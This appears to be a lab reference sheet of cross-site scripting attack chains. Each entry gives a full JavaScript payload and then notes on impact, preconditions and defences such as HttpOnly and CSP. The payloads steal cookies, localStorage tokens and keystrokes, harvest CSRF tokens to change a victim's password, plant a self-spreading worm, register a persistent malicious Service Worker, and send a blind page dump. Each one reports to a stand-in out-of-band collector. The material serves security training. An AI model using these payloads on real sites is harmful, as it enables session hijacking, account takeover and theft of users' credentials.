A. Cookie & Token Exfiltration
CHAINCOOKIE THEFT
01
<img src=x onerror="new Image().src='http://localhost:5001/oob?c='+encodeURIComponent(document.cookie)">
ImpactSession hijacking — attacker replays stolen cookie to authenticate as victim RequiresCookie NOT HttpOnly (HttpOnly prevents JS reading document.cookie) Stopped byHttpOnly cookie flag; CSP connect-src; SameSite=Strict NoteEven with HttpOnly, XSS can still forge authenticated requests (see P03). Cookie theft is only one chain — not having cookies readable doesn't prevent account takeover.
CHAINLOCALSTORAGE DUMP
02
<img src=x onerror=" const data = { ls: JSON.stringify(localStorage), ss: JSON.stringify(sessionStorage), cookie: document.cookie, url: location.href }; fetch('http://localhost:5001/oob?' + new URLSearchParams(data)); ">
ImpactJWT theft, OAuth token exfil, any client-side state (modern SPAs store tokens in localStorage) RequiresXSS execution in the SPA's origin Stopped byCSP connect-src limiting fetch targets; storing sensitive tokens in memory not localStorage NoteReact/Vue/Angular SPAs that use JWTs commonly store them in localStorage — accessible to any JS on the same origin. One XSS → all tokens exfiltrated. Recommendation: store JWTs in memory (variable) or HttpOnly cookies, not localStorage.
B. CSRF Token Theft → Forced Action
CHAINACCOUNT TAKEOVER
03
<img src=x onerror=" fetch('/auth/settings') .then(r => r.text()) .then(html => { const token = (html.match(/name=['\"]csrf['\"].*?value=['\"]([^'\"]+)/s)||[])[1]||''; return fetch('/auth/change-password', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'csrf=' + encodeURIComponent(token) + '&new_password=hacked123&confirm=hacked123' }); }) .then(() => new Image().src = 'http://localhost:5001/oob?pwned=changepw') ">
ImpactFull account takeover — victim's password changed without their knowledge Why CSRF tokens don't helpXSS runs same-origin → can read any page → CSRF token is visible in the HTML response → submits valid request with token Stopped byRe-authentication for password change (require current password); CSP; preventing XSS in the first place NoteThe two-step async chain: first GET /settings to harvest the CSRF token, then POST with it. CSRF protection is designed for cross-origin requests — it's ineffective once you have same-origin code execution.

D. Self-Propagating Worm Skeleton
WORMSELF-PROPAGATING
06
<img src=x onerror=" (function worm(){ // Step 1: get CSRF token fetch('/auth/settings').then(r=>r.text()).then(html=>{ const csrf = (html.match(/name=['\"]csrf['\"].*?value=['\"]([^'\"]+)/s)||[])[1]||''; // Step 2: replicate — copy worm payload into current user's profile/bio const payload = document.currentScript ? document.currentScript.outerHTML : '<img src=x onerror=\"[WORM]\">'; // fallback (replace with full payload) fetch('/auth/profile', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'csrf='+encodeURIComponent(csrf)+'&bio='+encodeURIComponent(payload) }); // Step 3: add attacker as friend / follow (social propagation vector) fetch('/social/follow', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'csrf='+encodeURIComponent(csrf)+'&user=attacker' }); // Step 4: OOB notification new Image().src = 'http://localhost:5001/oob?worm=infected&victim='+encodeURIComponent(location.href); }); })(); ">
ImpactViral propagation — every infected profile infects every visitor; exponential spread (Samy worm pattern) RequiresStored XSS sink in a user-visible field; write-back capability (update profile/post) Stopped byOutput encoding at display time; rate-limiting profile updates; CSP; sandboxing user content on separate subdomains NoteThe worm pattern from M16. Three conditions for a worm: (1) stored XSS sink, (2) write-back to a visible field, (3) that field is shown to other users. Breaking any one condition stops propagation. The Samy worm spread to 1M accounts in 20 hours with exactly this structure.
E. Keylogger & Clipboard Capture
CHAINKEYLOGGER
07
<img src=x onerror=" let buf = ''; document.addEventListener('keydown', e => { buf += e.key; if (buf.length > 50) { new Image().src = 'http://localhost:5001/oob?k=' + encodeURIComponent(buf); buf = ''; } }); ">
ImpactCaptures all keystrokes on the page — passwords, messages, search queries Techniquedocument-level keydown listener buffers keystrokes and exfiltrates in chunks Stopped byCSP (blocks inline event handler setup in onerror); CSP img-src restricting beacon targets; preventing XSS NoteFires on every key including backspace, enter, and modifier keys. Password field content is captured as the user types, before any form submission. The buffer approach avoids making a network request per keystroke.
CHAINCLIPBOARD
08
<img src=x onerror=" document.addEventListener('copy', async () => { try { const text = await navigator.clipboard.readText(); new Image().src = 'http://localhost:5001/oob?clip=' + encodeURIComponent(text); } catch(e) {} }); ">
ImpactCaptures clipboard content on every copy operation — passwords from password managers, sensitive data Requiresclipboard-read permission (browser prompts user — often auto-denied); copy event fires freely but readText requires permission Stopped byBrowser clipboard permission model; CSP; preventing XSS Notenavigator.clipboard.readText() requires the "clipboard-read" permission. The copy event fires without permission. Combined: waits for user to copy something, then attempts to read clipboard. Permission prompt may alert the user.
F. Persistence
CHAINPERSISTENCE
09
<img src=x onerror=" // Register a malicious Service Worker that intercepts all requests if ('serviceWorker' in navigator) { const swCode = \` self.addEventListener('fetch', e => { // Log all requests to attacker server fetch('http://localhost:5001/oob?sw_url=' + encodeURIComponent(e.request.url)); // Or: intercept and modify responses }); \`; const blob = new Blob([swCode], {type:'application/javascript'}); const url = URL.createObjectURL(blob); navigator.serviceWorker.register(url) .then(() => new Image().src = 'http://localhost:5001/oob?sw=registered'); } ">
ImpactPersistent interception of all page requests — survives page reload, logs all network activity RequiresHTTPS (Service Workers require secure context); same-origin SW registration scope Stopped byCSP worker-src (blocks blob: URL for SW); Service Worker scope restrictions; clearing SW registrations; HTTPS only (protects against network-level but not same-origin XSS) NoteService Workers persist after the page is closed. Once registered from an XSS payload, the SW intercepts every subsequent request to the origin — even in a clean browser tab. CSP worker-src blocking blob: URLs prevents registration from an XSS payload.
CHAINBLIND OOB
10
<img src=x onerror=" // Complete blind XSS callback with full context const payload = { url: location.href, title: document.title, cookie: document.cookie, ls: JSON.stringify(localStorage), referrer: document.referrer, ua: navigator.userAgent, ts: new Date().toISOString(), dom: document.documentElement.innerHTML.slice(0, 2000) }; // Use sendBeacon for reliability (fires even if page navigates away) navigator.sendBeacon('http://localhost:5001/oob', JSON.stringify(payload)); ">
ImpactBlind XSS callback — captures full page context when attacker cannot watch execution directly (admin panels, log viewers, PDF generators) TechniquesendBeacon() fires even on page unload; includes full DOM snapshot, cookies, localStorage, UA, timestamp Stopped byCSP connect-src; output encoding at the admin panel display; Trusted Types NoteBlind XSS (M11 pattern). The payload fires in an admin panel where the attacker has no visibility. sendBeacon is preferred over Image() for blind XSS — it fires reliably even when the admin quickly closes the page or it's a headless PDF renderer.
